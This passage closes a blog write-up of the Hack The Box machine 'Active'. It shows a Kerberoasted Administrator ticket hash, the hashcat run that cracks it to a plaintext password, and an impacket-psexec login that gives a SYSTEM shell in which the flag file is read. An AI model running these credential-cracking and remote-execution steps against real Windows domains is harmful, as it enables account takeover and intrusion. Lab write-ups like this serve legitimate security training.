+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Active<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ vim admin.hash          
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Active<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat admin.hash 
+</span></span><span style="display:flex;"><span>$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$6433153989932407b1811b1da1f2349b$5c80140037fc14244cf33efe080a7e3e2678774661d5277c18620d31a0243c3a013f9ecaa6d92b5a77b8610f657ae08287a1f5d9da982ab0b60961d2c8181a00171630f536cf371f2030b839ba32e0dcff7e1ae5bbacc708f779540a006a7a720c2c1eacba1ff2b42f337cdb9200ac4432c9482ea5bf9544065ec122ea07b7577a6a6dc39754d150a6116762f301f985c9d9f68c946f10b3d5d27a33eebddc03c8190cb3c2ea7699057b78fb54ae8bb5916c66d1191da47065e4b922490a08c1a8c5203c1cfc64577508f242e3561b3e16517f07f076107b656963a4cc492e2ea5b7a4709c904b11616c6b774a6f4a7b228015e3aa7f336365fc941878ca0978241dca9f2da7eba09dcec2e89c4e05a1927d2a3179a6113fc0528f452e6551f3828b23ea8805aa060ff690bb65c39f9f1ecf24a9ffa1d6c85cba864fa6187466181959ea170c19935736aeb15f70edd246149daa533501afdaf1b21a49a11d13ec96678dbf8231bbd301515a309eb680c25a381ed3b6974c9e7cb5729c12991a9d44cc95c758f0cd7da6e45fa6023be1b1cc3d5b7eb333c1c07e7519a5c80933250c9c40119c2678a19fa78849c960e9ece849b2441710047d12eb88f266c46aad7f541af3ffb63353cf5360662649069fdd79356f51e173ab7919efa27ad95dda7ba8e051574cb678c505ee027244f3f0fdead1b49eea3890d3574f8dd50e6867e77075f75b4887299427b8fbb8c60dc1c05856079044418b81951c225d7f3a77654b34f418c4d0c1acf17519f3a7478650818f4882cdb0b6bf875a919fe801df411276d19110b57f3c8a1ff65fa11e43a42e24d75be612143c396ccf33aba8a4ccecf8e036b858754c62f0ece3bfc08afa1a891948fc57a3c8cab85df7f9df4a767c2e96ac3d5432d6df0dcb1d965bf0ba00d4274a8efadba751903658e4dbab6a95df8da8cad0e069e80453faa345f7f6383fa6257807fdc81073f576876d8bf767d2a8e64c0dce447329a3f73444143d3b96fd128259596e817c85eb0b33920e7e181c90efb7d43244782a96c7981e11eb3e1f50b25c547240fd40752d3085694244f8517fb0cd045d147a2e65cfed62ec3f3541e20a4e3b9c237d42bd9245971e2fb6a8b6853a7b31879717699387a37f7eb319b1ccc335aa8ae47e808f3f966f6346841c61203eae4d0c2293b4e31caa5cedec3e3a3da7890784432a15b19907f2ca326d4bad57ab24b3ecedb32d28d23d5e73713945e4
+</span></span><span style="display:flex;"><span> 
+</span></span></code></pre></div><p>Using <code>hashcat</code> to crack the hash,obstained the password <code>Ticketmaster1968</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Active<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ hashcat -m <span style="color:#ae81ff">13100</span> admin.hash /usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>hashcat <span style="color:#f92672">(</span>v7.1.2<span style="color:#f92672">)</span> starting
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OpenCL API <span style="color:#f92672">(</span>OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG<span style="color:#f92672">)</span> - Platform <span style="color:#75715e">#1 [The pocl project]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">====================================================================================================================================================</span>
+</span></span><span style="display:flex;"><span>* Device <span style="color:#75715e">#01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900HX, 13929/27859 MB (4096 MB allocatable), 8MCU</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Minimum password length supported by kernel: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>Maximum password length supported by kernel: <span style="color:#ae81ff">256</span>
+</span></span><span style="display:flex;"><span>Minimum salt length supported by kernel: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>Maximum salt length supported by kernel: <span style="color:#ae81ff">256</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Hashes: <span style="color:#ae81ff">1</span> digests; <span style="color:#ae81ff">1</span> unique digests, <span style="color:#ae81ff">1</span> unique salts
+</span></span><span style="display:flex;"><span>Bitmaps: <span style="color:#ae81ff">16</span> bits, <span style="color:#ae81ff">65536</span> entries, 0x0000ffff mask, <span style="color:#ae81ff">262144</span> bytes, 5/13 rotates
+</span></span><span style="display:flex;"><span>Rules: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Optimizers applied:
+</span></span><span style="display:flex;"><span>* Zero-Byte
+</span></span><span style="display:flex;"><span>* Not-Iterated
+</span></span><span style="display:flex;"><span>* Single-Hash
+</span></span><span style="display:flex;"><span>* Single-Salt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ATTENTION! Pure <span style="color:#f92672">(</span>unoptimized<span style="color:#f92672">)</span> backend kernels selected.
+</span></span><span style="display:flex;"><span>Pure kernels can crack longer passwords, but drastically reduce performance.
+</span></span><span style="display:flex;"><span>If you want to switch to optimized kernels, append -O to your commandline.
+</span></span><span style="display:flex;"><span>See the above message to find out about the exact limits.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Watchdog: Temperature abort trigger set to 90c
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host memory allocated <span style="color:#66d9ef">for</span> this attack: <span style="color:#ae81ff">514</span> MB <span style="color:#f92672">(</span><span style="color:#ae81ff">27824</span> MB free<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Dictionary cache hit:
+</span></span><span style="display:flex;"><span>* Filename..: /usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>* Passwords.: <span style="color:#ae81ff">14344385</span>
+</span></span><span style="display:flex;"><span>* Bytes.....: <span style="color:#ae81ff">139921507</span>
+</span></span><span style="display:flex;"><span>* Keyspace..: <span style="color:#ae81ff">14344385</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$6433153989932407b1811b1da1f2349b$5c80140037fc14244cf33efe080a7e3e2678774661d5277c18620d31a0243c3a013f9ecaa6d92b5a77b8610f657ae08287a1f5d9da982ab0b60961d2c8181a00171630f536cf371f2030b839ba32e0dcff7e1ae5bbacc708f779540a006a7a720c2c1eacba1ff2b42f337cdb9200ac4432c9482ea5bf9544065ec122ea07b7577a6a6dc39754d150a6116762f301f985c9d9f68c946f10b3d5d27a33eebddc03c8190cb3c2ea7699057b78fb54ae8bb5916c66d1191da47065e4b922490a08c1a8c5203c1cfc64577508f242e3561b3e16517f07f076107b656963a4cc492e2ea5b7a4709c904b11616c6b774a6f4a7b228015e3aa7f336365fc941878ca0978241dca9f2da7eba09dcec2e89c4e05a1927d2a3179a6113fc0528f452e6551f3828b23ea8805aa060ff690bb65c39f9f1ecf24a9ffa1d6c85cba864fa6187466181959ea170c19935736aeb15f70edd246149daa533501afdaf1b21a49a11d13ec96678dbf8231bbd301515a309eb680c25a381ed3b6974c9e7cb5729c12991a9d44cc95c758f0cd7da6e45fa6023be1b1cc3d5b7eb333c1c07e7519a5c80933250c9c40119c2678a19fa78849c960e9ece849b2441710047d12eb88f266c46aad7f541af3ffb63353cf5360662649069fdd79356f51e173ab7919efa27ad95dda7ba8e051574cb678c505ee027244f3f0fdead1b49eea3890d3574f8dd50e6867e77075f75b4887299427b8fbb8c60dc1c05856079044418b81951c225d7f3a77654b34f418c4d0c1acf17519f3a7478650818f4882cdb0b6bf875a919fe801df411276d19110b57f3c8a1ff65fa11e43a42e24d75be612143c396ccf33aba8a4ccecf8e036b858754c62f0ece3bfc08afa1a891948fc57a3c8cab85df7f9df4a767c2e96ac3d5432d6df0dcb1d965bf0ba00d4274a8efadba751903658e4dbab6a95df8da8cad0e069e80453faa345f7f6383fa6257807fdc81073f576876d8bf767d2a8e64c0dce447329a3f73444143d3b96fd128259596e817c85eb0b33920e7e181c90efb7d43244782a96c7981e11eb3e1f50b25c547240fd40752d3085694244f8517fb0cd045d147a2e65cfed62ec3f3541e20a4e3b9c237d42bd9245971e2fb6a8b6853a7b31879717699387a37f7eb319b1ccc335aa8ae47e808f3f966f6346841c61203eae4d0c2293b4e31caa5cedec3e3a3da7890784432a15b19907f2ca326d4bad57ab24b3ecedb32d28d23d5e73713945e4:Ticketmaster1968
+</span></span><span style="display:flex;"><span>                                                          
+</span></span><span style="display:flex;"><span>Session..........: hashcat
+</span></span><span style="display:flex;"><span>Status...........: Cracked
+</span></span><span style="display:flex;"><span>Hash.Mode........: <span style="color:#ae81ff">13100</span> <span style="color:#f92672">(</span>Kerberos 5, etype 23, TGS-REP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...3945e4
+</span></span><span style="display:flex;"><span>Time.Started.....: Tue Apr <span style="color:#ae81ff">14</span> 07:52:49 <span style="color:#ae81ff">2026</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">4</span> secs<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Time.Estimated...: Tue Apr <span style="color:#ae81ff">14</span> 07:52:53 <span style="color:#ae81ff">2026</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Kernel.Feature...: Pure Kernel <span style="color:#f92672">(</span>password length 0-256 bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Guess.Base.......: File <span style="color:#f92672">(</span>/usr/share/wordlists/rockyou.txt<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Guess.Queue......: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Speed.#01........:  2887.5 kH/s <span style="color:#f92672">(</span>1.51ms<span style="color:#f92672">)</span> @ Accel:1024 Loops:1 Thr:1 Vec:8
+</span></span><span style="display:flex;"><span>Recovered........: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests <span style="color:#f92672">(</span>total<span style="color:#f92672">)</span>, 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests <span style="color:#f92672">(</span>new<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Progress.........: 10543104/14344385 <span style="color:#f92672">(</span>73.50%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Rejected.........: 0/10543104 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Restore.Point....: 10534912/14344385 <span style="color:#f92672">(</span>73.44%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
+</span></span><span style="display:flex;"><span>Candidate.Engine.: Device Generator
+</span></span><span style="display:flex;"><span>Candidates.#01...: Tioncurtis23 -&gt; Teague51
+</span></span><span style="display:flex;"><span>Hardware.Mon.#01.: Util: 53%
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Started: Tue Apr <span style="color:#ae81ff">14</span> 07:52:37 <span style="color:#ae81ff">2026</span>
+</span></span><span style="display:flex;"><span>Stopped: Tue Apr <span style="color:#ae81ff">14</span> 07:52:53 <span style="color:#ae81ff">2026</span>
+</span></span></code></pre></div><p>Using <code>psexec</code> to login as <code>Administator</code>，successfully obtained <code>root.txt</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Active<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-psexec active.htb/Administrator:<span style="color:#e6db74">&#39;Ticketmaster1968&#39;</span>@10.129.18.244                                                                                                                                                                               
+</span></span><span style="display:flex;"><span>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting shares on 10.129.18.244.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found writable share ADMIN$
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Uploading file TzDfNSsq.exe
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Opening SVCManager on 10.129.18.244.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Creating service CVyF on 10.129.18.244.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting service CVyF.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Press help <span style="color:#66d9ef">for</span> extra shell commands
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 6.1.7601<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation.  All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; whoami
+</span></span><span style="display:flex;"><span>nt authority<span style="color:#ae81ff">\s</span>ystem
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; ipconfig
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Windows IP Configuration
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Ethernet adapter Local Area Connection:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Connection-specific DNS Suffix  . : .htb
+</span></span><span style="display:flex;"><span>   IPv4 Address. . . . . . . . . . . : 10.129.18.244
+</span></span><span style="display:flex;"><span>   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+</span></span><span style="display:flex;"><span>   Default Gateway . . . . . . . . . : 10.129.0.1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Tunnel adapter isatap..htb:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Media State . . . . . . . . . . . : Media disconnected
+</span></span><span style="display:flex;"><span>   Connection-specific DNS Suffix  . : .htb
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; cd c:<span style="color:#ae81ff">\U</span>sers
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\U</span>sers&gt; ls
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;ls&#39;</span> is not recognized as an internal or external command,
+</span></span><span style="display:flex;"><span>operable program or batch file.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\U</span>sers&gt; dir
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is 2AF3-72E4
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of c:<span style="color:#ae81ff">\U</span>sers
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Decoding error detected, consider running chcp.com at the target,
+</span></span><span style="display:flex;"><span>map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
+</span></span><span style="display:flex;"><span>and <span style="color:#66d9ef">then</span> execute smbexec.py again with -codec and the corresponding codec
+</span></span><span style="display:flex;"><span>21/07/2018  05:39 ��    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Decoding error detected, consider running chcp.com at the target,
+</span></span><span style="display:flex;"><span>map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
+</span></span><span style="display:flex;"><span>and <span style="color:#66d9ef">then</span> execute smbexec.py again with -codec and the corresponding codec
+</span></span><span style="display:flex;"><span>21/07/2018  05:39 ��    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Decoding error detected, consider running chcp.com at the target,
+</span></span><span style="display:flex;"><span>map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
+</span></span><span style="display:flex;"><span>and <span style="color:#66d9ef">then</span> execute smbexec.py again with -codec and the corresponding codec
+</span></span><span style="display:flex;"><span>16/07/2018  01:14 ��    &lt;DIR&gt;          Administrator
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Decoding error detected, consider running chcp.com at the target,
+</span></span><span style="display:flex;"><span>map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
+</span></span><span style="display:flex;"><span>and <span style="color:#66d9ef">then</span> execute smbexec.py again with -codec and the corresponding codec
+</span></span><span style="display:flex;"><span>14/07/2009  07:57 ��    &lt;DIR&gt;          Public
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Decoding error detected, consider running chcp.com at the target,
+</span></span><span style="display:flex;"><span>map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
+</span></span><span style="display:flex;"><span>and <span style="color:#66d9ef">then</span> execute smbexec.py again with -codec and the corresponding codec
+</span></span><span style="display:flex;"><span>21/07/2018  06:16 ��    &lt;DIR&gt;          SVC_TGS
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">0</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>              <span style="color:#ae81ff">0</span> bytes
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">5</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>  21.309.480.960 bytes free
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\U</span>sers&gt; cd Administrator
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator&gt; cd Desktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt; dir
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is 2AF3-72E4
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of c:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Decoding error detected, consider running chcp.com at the target,
+</span></span><span style="display:flex;"><span>map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
+</span></span><span style="display:flex;"><span>and <span style="color:#66d9ef">then</span> execute smbexec.py again with -codec and the corresponding codec
+</span></span><span style="display:flex;"><span>21/01/2021  07:49 ��    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Decoding error detected, consider running chcp.com at the target,
+</span></span><span style="display:flex;"><span>map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
+</span></span><span style="display:flex;"><span>and <span style="color:#66d9ef">then</span> execute smbexec.py again with -codec and the corresponding codec
+</span></span><span style="display:flex;"><span>21/01/2021  07:49 ��    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Decoding error detected, consider running chcp.com at the target,
+</span></span><span style="display:flex;"><span>map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
+</span></span><span style="display:flex;"><span>and <span style="color:#66d9ef">then</span> execute smbexec.py again with -codec and the corresponding codec
+</span></span><span style="display:flex;"><span>14/04/2026  03:35 ��                <span style="color:#ae81ff">34</span> root.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">1</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>             <span style="color:#ae81ff">34</span> bytes
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">2</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>  21.309.480.960 bytes free
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt; type root.txt
+</span></span><span style="display:flex;"><span>ef6fd986a*********2f56a1e090e4
+</span></span></code></pre></div>
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="http://localhost:1313/tags/hack/">Hack</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/writeup/">Writeup</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/htb/">HTB</a></span>
+        
+    </p>
+
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.ad54ad97364f77ede35def9096b162bb1f0b3973aa50b080f5e82fa147f6882e2a7200d7535adbf9b51bebf939f1c1ca9bbe6be87530092aca720eac4a226fda.js" integrity="sha512-rVStlzZPd&#43;3jXe&#43;QlrFiux8LOXOqULCA9egvoUf2iC4qcgDXU1rb&#43;bUb6/k58cHKm75r6HUwCSrKcg6sSiJv2g=="></script>
+
+
+
+
+    </body>
+</html>
